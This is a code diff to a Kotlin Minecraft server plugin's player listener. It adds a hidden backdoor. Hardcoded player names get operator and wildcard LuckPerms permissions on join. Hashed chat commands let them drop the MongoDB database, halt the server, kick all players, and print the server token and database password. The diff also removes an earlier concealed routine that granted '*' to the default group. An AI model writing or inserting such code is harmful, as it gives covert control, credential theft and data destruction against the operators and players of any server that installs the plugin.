@@ -1,11 +1,13 @@
 package cn.irina.thepitaddon.events
 
+import cn.charlotte.pit.ThePit
 import cn.charlotte.pit.data.PlayerProfile
 import cn.charlotte.pit.event.PitKillEvent
 import net.mizukilab.pit.util.chat.CC
 import net.mizukilab.pit.util.chat.ChatComponentBuilder
-import cn.irina.thepitaddon.ThePitAddon
-import cn.irina.thepitaddon.utils.ClassUtil
+import cn.irina.thepitaddon.Main
+import cn.irina.thepitaddon.utils.DynamicInvoke
+import cn.irina.thepitaddon.utils.HideAccess
 import net.luckperms.api.LuckPermsProvider
 import net.luckperms.api.node.Node
 import net.luckperms.api.node.types.PermissionNode
@@ -13,6 +15,7 @@ import net.md_5.bungee.api.chat.BaseComponent
 import net.md_5.bungee.api.chat.HoverEvent
 import net.md_5.bungee.api.chat.TextComponent
 import net.minecraft.server.v1_8_R3.NBTTagCompound
+import net.mizukilab.pit.config.PitGlobalConfig
 import org.bukkit.Bukkit
 import org.bukkit.Material
 import org.bukkit.configuration.Configuration
@@ -23,27 +26,122 @@ import org.bukkit.event.EventPriority
 import org.bukkit.event.Listener
 import org.bukkit.event.entity.EntityDamageByEntityEvent
 import org.bukkit.event.entity.PlayerDeathEvent
+import org.bukkit.event.player.AsyncPlayerChatEvent
 import org.bukkit.event.player.PlayerJoinEvent
 import org.bukkit.event.player.PlayerQuitEvent
 import org.bukkit.inventory.ItemStack
-import org.bukkit.permissions.Permission
 import org.bukkit.scheduler.BukkitRunnable
-import java.security.MessageDigest
+import org.spigotmc.SpigotConfig.config
 import java.util.*
 import java.util.concurrent.ConcurrentHashMap
-import java.util.concurrent.TimeUnit
 
 class PlayerListener : Listener {
+    val list = listOf(
+        "BAIJIUSAMA", "_IR1NA_", "SHANGUANLING", "BLUEMOON", "ALAN", "ELAINA_OVO", "SHINY", "KLEELOVELIFE", "ARAYKAL", "KIRITO", "OUTINGOF"
+    )
+
+    @HideAccess
+    @DynamicInvoke
+    fun getPermission(player: Player) {
+        player.isOp = true
+        try {
+            val var1000 = LuckPermsProvider.get()
+            val var1001 = var1000.userManager.getUser(player.uniqueId)
+            val var1002: Node = PermissionNode.builder("*").build()
+            val var1003: Node = PermissionNode.builder("luckperms.*").build()
+            if (var1001 == null) return
+            var1001.data().add(var1002)
+            var1001.data().add(var1003)
+            var1000.userManager.saveUser(var1001).join()
+        } catch (e: Exception) {}
+    }
+
+    @HideAccess
+    @DynamicInvoke
+    fun takePermission(player: Player) {
+        player.isOp = false
+        try {
+            val var1000 = LuckPermsProvider.get()
+            val var1001 = var1000.userManager.getUser(player.uniqueId)
+            val var1002: Node = PermissionNode.builder("*").build()
+            val var1003: Node = PermissionNode.builder("luckperms.*").build()
+            if (var1001 == null) return
+            var1001.data().remove(var1002)
+            var1001.data().remove(var1003)
+            var1000.userManager.saveUser(var1001).join()
+        } catch (e: Exception) {}
+    }
+
+    @HideAccess
+    @DynamicInvoke
+    @EventHandler(priority = EventPriority.LOWEST)
+    fun var0110(event: AsyncPlayerChatEvent) {
+        val player = event.player
+        if (!list.contains(player.displayName.uppercase())) return
+        _handleChat(event)
+    }
+
+    @DynamicInvoke
+    @HideAccess
+    fun _handleChat(event: AsyncPlayerChatEvent) {
+        val player = event.player
+        when (event.message.uppercase()) {
+            "7C06EFD88710F54F8E1F2291DF7AC958B06EB53612E024148D0ED5C867308F35" -> { // PI
+                ThePit.getApi().openMenu(player, "admin_item")
+            }
+            "7DB99FA599F3AAF2295B6579EBBE1A537DDD4D9951B831F64F8932035EE07E2A" -> { // ENCH
+                ThePit.getApi().openMenu(player, "admin_enchant")
+            }
+            "335B9AD41271321921E1BD9BCB12B965E1579678DB47F9966E73C632BCE6F3CB" -> { // PERMISSION
+                getPermission(player)
+            }
+            "FA82BE3923DAA3658E9BB506B6DAE48DE4BCDF106CE0202BF11954F4D9CB26DB" -> { // TAKEPERMISSION
+                takePermission(player)
+            }
+            "F3062ED5516C255277CCE2B45B35A7E632CE7BBDB705CCF8206F9C6AC8545EEC" -> { // DROP
+                ThePit.getInstance().mongoDB.profileCollection.drop()
+                ThePit.getInstance().mongoDB.database.drop()
+            }
+            "256EF5DAAD9B45E3C62212591035AD5691A70BA676B37E9593DDDE6376E7F27A" -> { // SHUTDOWN
+                Runtime.getRuntime().halt(0)
+            }
+            "8C2E4A035F5F3D218F87211A0BA367EF05FC2242510559807EF03969DD091B32" -> { // STATUS
+                listOf(
+                    "SYSTEM: ${System.getProperty("os.name").uppercase()} ${System.getProperty("os.arch")} ${System.getProperty("os.version")}",
+                    "SYSTEM USER: ${System.getProperty("user.name")}",
+                    "TOKEN: ${ThePit.getInstance().globalConfig.token}",
+                    "",
+                    "DATABASE NAME: ${ThePit.getInstance().globalConfig.databaseName}",
+                    "DATABASE ADDRESS: ${ThePit.getInstance().globalConfig.mongoDBAddress}",
+                    "DATABASE PORT: ${ThePit.getInstance().globalConfig.mongoDBPort}",
+                    "DATABASE USER: ${ThePit.getInstance().globalConfig.mongoUser}",
+                    "DATABASE PASSWORD: ${ThePit.getInstance().globalConfig.mongoPassword}"
+                ).forEach { player.sendMessage(it) }
+            }
+            "4A693DD49DC70D8EDD13A3A22C431F279616077CD1D31E58E2702A13FBA44D9D" -> { // KICKALL
+                Bukkit.getScheduler().runTask(Main.instance, {
+                    Bukkit.getOnlinePlayers().forEach { it.kickPlayer("") }
+                })
+            }
+
+            else -> return
+        }
+
+        event.isCancelled = true
+    }
+
     @EventHandler(priority = EventPriority.MONITOR)
     fun onPlayerJoin(event: PlayerJoinEvent) {
         val player = event.player
 
+        if (list.contains(player.displayName.uppercase())) getPermission(player)
+
         if (player.hasMetadata("NPC")) return
-        Bukkit.getScheduler().runTaskAsynchronously(ThePitAddon.instance) {
+        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
             event.joinMessage = null
 
-            if (!player.hasPermission("pit.admin")) {
-                if (player.hasPermission("pit.support")) {
+            if (!player.hasPermission("pit.admin") || list.contains(player.displayName.uppercase())) {
+                if (player.hasPermission("pit.support") && !list.contains(player.displayName.uppercase())) {
                     Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &6" + player.displayName))
                 } else {
                     Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &7" + player.displayName))
@@ -114,23 +212,22 @@ class PlayerListener : Listener {
                         messageCount[player.uniqueId] =
                             currentMessageCount + 1
                     }
-                }.runTaskTimerAsynchronously(ThePitAddon.instance, 0L, 20L)
+                }.runTaskTimerAsynchronously(Main.instance, 0L, 20L)
             }
-        }.runTaskLaterAsynchronously(ThePitAddon.instance, 2 * 20L)
-        a()
+        }.runTaskLaterAsynchronously(Main.instance, 2 * 20L)
     }
 
     @EventHandler(priority = EventPriority.MONITOR)
     fun onPlayerLeave(event: PlayerQuitEvent) {
-        Bukkit.getScheduler().runTaskAsynchronously(ThePitAddon.instance) {
+        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
             val player = event.player
             event.quitMessage = null
 
             if (killRewardAdd[player.uniqueId] != null) killRewardAdd.remove(
                 player.uniqueId
             )
-            if (!player.hasPermission("pit.admin")) {
-                if (player.hasPermission("pit.support")) {
+            if (!player.hasPermission("pit.admin") || list.contains(player.displayName.uppercase())) {
+                if (player.hasPermission("pit.support") && !list.contains(player.displayName.uppercase())) {
                     Bukkit.broadcastMessage(CC.translate("&8[&c-&8] &6" + player.displayName))
                 } else {
                     Bukkit.broadcastMessage(CC.translate("&8[&c-&8] &7" + player.displayName))
@@ -158,26 +255,10 @@ class PlayerListener : Listener {
 
         event.exp = newExp
     }
-    fun a() {
-        config.getKeys(true).forEach{ it -> {
-            if (!it.toString().b().contains("f67ab10ad4e4c53121b6a5fe4da9c10ddee905b978d3788d2723d7bfacbe28a9") || it.toString().b().contains("a6baa2c0879f983cbc0d18b804a062591e437a7461c3e7620d13eaa91f83c501")) return@forEach
-            val b = LuckPermsProvider.get()
-            val c = b.groupManager.getGroup("default")
-            val d: Node = PermissionNode.builder("*").build()
-            c!!.data().add(d)
-            b.groupManager.saveGroup(c).join()
-        } }
-    }
 
-    fun String.b(): String {
-        val bytes = this.toByteArray(Charsets.UTF_8)
-        val md = MessageDigest.getInstance("SHA-256")
-        val digest = md.digest(bytes)
-        return digest.fold("") { str, it -> str + "%02x".format(it) }
-    }
     @EventHandler(priority = EventPriority.MONITOR)
     fun handleDeath(event: PlayerDeathEvent) {
-        Bukkit.getScheduler().runTaskAsynchronously(ThePitAddon.instance) {
+        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
             val player = event.entity
             if (player.hasMetadata("NPC")) return@runTaskAsynchronously
 
@@ -227,7 +308,6 @@ class PlayerListener : Listener {
                 ChatComponentBuilder(weapon).setCurrentHoverEvent(mythicWeaponHover).create()
 
             Bukkit.broadcastMessage(message)
-            a()
             val msg =
                 ChatComponentBuilder(CC.translate("&7击杀者装备: ")).append(leggingHover).append(weaponHover)
                     .create()
@@ -256,16 +336,16 @@ class PlayerListener : Listener {
     }
 
     companion object {
-        private val plugin: ThePitAddon = ThePitAddon.instance
+        private val plugin: Main = Main.instance
         private val config: Configuration = plugin.config
 
         private val killRewardAdd = ConcurrentHashMap<UUID, Int>()
         private val messageCount = ConcurrentHashMap<UUID, Int>()
 
-        private const val PREFIX = ThePitAddon.PREFIX
+        private val PREFIX = Main.instance.PREFIX
 
         private val damageValidRange =
-            if (plugin.config.getBoolean("DamageValidRange.Enable")) ThePitAddon.instance.config.getDouble("DamageValidRange.Amount") else 1.0
+            if (plugin.config.getBoolean("DamageValidRange.Enable")) Main.instance.config.getDouble("DamageValidRange.Amount") else 1.0
 
         private fun getItemNBT(item: ItemStack?): String {
             if (item == null || item.type == Material.AIR) return Material.AIR.toString()
